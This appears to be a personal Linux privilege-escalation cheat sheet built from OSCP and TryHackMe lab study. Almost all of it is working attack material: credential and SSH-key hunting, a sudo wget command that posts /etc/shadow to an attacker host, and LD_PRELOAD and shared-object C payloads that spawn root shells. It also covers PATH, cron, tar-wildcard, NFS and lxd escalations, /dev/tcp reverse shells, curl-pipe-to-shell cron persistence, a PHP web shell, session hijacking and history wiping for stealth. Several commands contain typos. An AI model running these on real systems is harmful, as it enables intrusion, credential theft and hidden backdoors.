# Got on the box, have a look
## But first, Before running to gtfobins or enumeration scripts always!

### RTFM, Ready the binaries to drop - check the 32bit or 64bit!  
### Dont rely one or two enumeration scripts for this specific task
### Don't be lazy but not be stupid scripts that try to exploit are good for OSCP:

[LinEmun](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```


## Lay of the land enumeration:
```bash
id                      # user and usergroup info
ls -la                  # never use ls
uname -a                # get system info # search for kernel exploits as last resort
sudo -V                 # version
sudo id                 # get id of sudo
visudo                  # sudo policy file
ps 1                    # Systemd or SysV init
ps aux                  # All processes, find weird processes run by root or horizonatals
ps ajxf                 # Process tree
env                     # Show environment variables
file /sbin/init         # Is asymbolic link to /lib/systemd/systemd OR..
history                 # Command history
ifconfig                # Network interfaces
ip route                # Network route
netstat -a              # All listening port and connections
netstat -at -au         # All TCP or UDP connections
netstat -l              # All listening ports
netstat -s              # Statistics
netstat -tp             # PID information
apt list --upgradeable  # Software installed and versioning
which python3 && which python && which nc; # list of stuff to use
```

## Files and artifacts of interest:
#### Passwords or shiny things?
```bash
grep -r -e ""
cat /home/<user>/myvpn.ovpn
cat /etc/openvpn/auth.txt
cat /home/<user>/.irssi/config | grep -i passw
cat ~/.bash_history | grep -i passw
## Found any?
/var/log
/var/log/auth.log

find / -type f -name "*.conf" 2>/dev/null
find / -type d -name "*.conf" 2>/dev/null
find / -type f -name config 2>/dev/null
find / -type f -name "*.log" 2>/dev/null
find . -type f 2>/dev/null             # for those id_rsas @rennox 

cat /etc/passwd                        # displays all users
cat /etc/passwd | grep home            # show all real users!
cat /etc/shells                        # displays all shells
cat /etc/crontab                       # displays all cronjobs
cat /etc/hosts
cat /etc/resolv.conf
ls -la ~/.*history                     # All the history files in a directory
cat ~/.*history | less                 # view all them
cat /proc/cpuinfo                      # duh, but also nproc show number of cpus
cat /proc/version                      # for kernel version
cat /etc/issue
cat /etc/exports                       # Check for no_squash_root on writable shares 
## Stored Creds in cat-able config, history, txt files
cat /../*.*vnp
         cat ~/.bash_history | grep -i passw
```

## World writable files and directories to check
```bash
ls -la /etc/hosts; ls -la /etc/crontab; ls -la /etc/shadow; ls -la /shadow.bak 
find / -writable -type d 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```
### touch or edit some file with for shell  
Don't forget Language, file extensions, shared binaries or libraries  
This just a placeholder example:  
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Weak file permission on password system
```bash
cat /etc/passwd | cut -d: -f1 | awk -F: '($3 == "0") {print}' /etc/passwd
ls -la /etc/shadow | cat /etc/shadow
```
#### probably better in persistence/backdoor areas as this seems rare writable /etc/passwd

```bash
openssl passwd newpasswordhere # Add a new root for passwd
mkpasswd -m sha-512 newpasswordhere # Add a new root for shadow
```

#### User-key related
Create a password hash that is compliant use ssh-keygen, generate a ssh key, store in /root/.ssh
```bash
openssl passwd -1 -salt [salt] [password]
chmod 600 $key
ssh -i id_rsa root@ip                      
```
Find those keys!
```bash
find / -name authorized_keys 2>/dev/null ## Find ssh keys
find / -name id_rsa 2>/dev/null
```
copy keys  
```bash
chmod 400 id_rsa
ssh -i _id_rsa [id]@[ip]
```

## Sudo 
### Sudo -flags
#### sudo -l
```bash
sudo -l -l # extra -l to check without password prompting
sudo /usr/bin/wget --post-file=/etc/shadow http//attackbox:port # Sudo -l but no password NO problem!
```
#### sudo -u to abuse file permission to call sudo through unsafe variable input, handling
sudo -u username unsafefileofusername # somehow pass /bin/bash as paramtres

#### Shell escaping, abusing intended functionality
**If find more I'll add more**  
```bash
sudo apache2 -f /etc/shadow
```

## Sudo LD_PRELOAD  
#### if LD_PRELOAD appears in output
create .c -> compile  
gcc ```gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles); ```  
This:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

This set the LD_PRELOAD to the path of a shared object, which will be loaded before any other library (including C runtime, libc.so  
```
sudo LD_PRELOAD=/tmp/x.so [/some/bin/or/prog]
```
##### Tiberius Room versions/additions: 

Careful `-nostartfiles` Do not use the standard system startup files when linking.
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c 
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
##### Also
```bash
ldd /usr/sbin/apache2 # find shared libraries
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
````
## SUID/SGID
### Find suid/sgid bins
Exploit-DB, Google, and GitHub  
GTFOBINs  
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -type f -perm -u=s -exec -ls -ldb {} \; 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
```

### SUID Environment Variables
First find vulnerable binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
**REQUIRES STRINGS!!**  
```bash
strings ../bin/<suid-env> # consider the function calls in the strings output
```
Injectable suidlib.c or some other function somewhere else in the file system?
Inject a path to renamed "escalation.c" to required by the binary *.c
```bash
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c #escalation->service.c
gcc /tmp/service.c -o /tmp/service # compile with naming to match target 
export PATH=/tmp:$:PATH # inject a path 
/usr/local/bin/<suid-env>
```
Dodgy services in the strings output
Method #1
> Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path. 

function /usr/sbin/service() { 
```bash
cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
export -f /usr/sbin/service
```  
Method #2  
ONLY Bash versions <= 4.3!!  
> When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements  
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

## Shared Object Injection
First ouput all SUID binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
````
List packages -> version enumeration!
```bash
dpkg -l | grep #for the package
```
Run strace to check if there missing binaries
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
Impersonate directory and file to replace missing SUID: mkdir /home/user/.confid | cd /home/user/.config
```c
#include <stdio.h>
#include <stdlib.h>

        static void inject() __attribute__((constructor));

        void inject() {
                system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
        }

```
Save libcalc.c 
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
```

## SUID (symlinks)
### Search-engine dorking commence  
```bash
dpkg -l | grep <program>
```

## Path injection
```bash
echo $PATH 
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
Make file identical to command, containing 'bash -p', chmoding, export PATH and then run vulnerable file
```bash
lsdir badapple; echo 'bash -p' > badapple/cp
chmod +x badapple/cp
export PATH="/dev/shm/badapple/:$PATH"
./runvulnbin
```

## Capabilities
```bash
getcap -r / 2>/dev/null
/usr/bin/python[ver] -c 'import os; os.setuid(0);os.system("/bin/bash")'
```

## Cron related 
```bash
cat /etc/crontab
ls -la [anyfiles] for permissions
cat [anyfiles] for wildcards in scripting
crontab -l # per-user user crontab!
```
### Cron Path
#### PATH variable of files
```bash
echo 'cp /bin/bash /tmp/bash; chmod +xs /tmp/bash' > /home/user/privescCron
chmod +x /home/user/privescCron
/tmp/bash -p
```
### Cron Wildcards
#### Either 1. use native binaries OR 2. msfvenom reverse shell
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/privescCron # Only 1st
touch /home/user/--checkpoint=1 # BOTH require this
touch /home/user/--checkpoint-action=exec=sh\ runme.sh #..=exec=shell.elf
/tmp/bash -p # Only 1st
```
## Cron File Permissions 
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/privescCron
/tmp/bash -p
```
## Services
###  Find services running as root ath are exploitable if no password is set!
```bash
ps -aux | grep root
```

## NFS root squshing - found ls -la /etc/exports ?
Find a " no_root_squash "
AttackBox:
```bash
showmount -e [ip]
mkdir /tmp/nameofmount
mount -o rw,vers=2 [ip]:/tmp!ORwhereEXPORT /tmp/nameofmount 
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/nameofmount/x.c
gcc /tmp/nameofmount/x.c -o /tmp/nameofmount/x
chmod +s /tmp/nameofmount/x
```
LinuxBox:
```bash
/nameofmount/x
```
## Find lxd and lxc?
### Enumerate and file transfer an image
```bash
lxd version
lxc image list
```
### 1. import image 2. run image 3. /mnt into box itself 4. start container and run sh
```bash
lxc image import ./alpine*.tar.gz --alias $myimage
lxc init $myimage $mycontainer -c security.privileged=true
lxc config device add $mycontainer  mydevice disk source=/ path=/mnt/root recursive=true
xc start $mycontainer
lxc exec $mycontainer /bin/sh
cd /mnt/INTO/INTOAGAIN # Metaphorical PrivEsc method of a portal gun and pirate ship boarding. :)
```

## Appendix 
#### File transfer
```bash
wget http://attacker:port/blackhat | bash
scp /file/path/to/favourite/script target@myhost.com:/file/path/target
curl -o badpackage.sh
```

#### Stealth
```bash
unset HISTFILE          disable writing to history file
```

####Backdoors required?
## Reference: https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c
## ssh
# It's not very hidden, easy to remove or detect
```bash
ssh-keygen
#drop public key in /target/.ssh
mkdir .ssh
chmod 600 id_rsa
```
## php
web root /var/www/html
`touch shell.php` and add the below:
Or add within a file of this directory
Change the 'cmd' paramtre to something that LESS like to be called 
```php
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```
## stealing php session
```bash
/var/lib/php/sessions # defauilt locations
sess_<SESSION_ID> # set your PHPSESSID cookie to hijack
```
Session files and cookie name are configurable in php.ini:
```php
session.save_path
session.name
```
## cronjob
```bash
CT=$(crontab -l)
CT=$CT$'\n* *     * * *   root    curl http://<ip>:<port>/run | sh'
printtf "$CT | cronbtab -
```
Serve shell script, for example:
file
```bash
#!/bin/bash
bash -i >& /dev/tcp/ip/port 0>&1
```
.bashrc
```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```
OR pam_unix.so [pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)


#### Resources

[lpeworkshop](https://github.com/sagishahar/lpeworkshop)
[netbiosX](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
[sushant747](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
[payatu](https://payatu.com/guide-linux-privilege-escalation)



#### Reference
# Unless speficied, the reference relates to general Liuux Privilege Escalation:

[9-ways-to-backdoor-a-linux-box(https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c) # Backdoors
[creating-backdoor-in-pam](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html) # pam _unix backdoors
[linuxbackdoors](https://tryhackme.com/room/linuxbackdoors) # Backdoors
[linprivesc](https://tryhackme.com/room/linprivesc)
[linuxprivesc](https://tryhackme.com/room/linuxprivesc) # Sagi Shahar/Tib3rius room
[linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)
[commonlinuxprivesc](https://tryhackme.com/room/commonlinuxprivesc)
                                                 
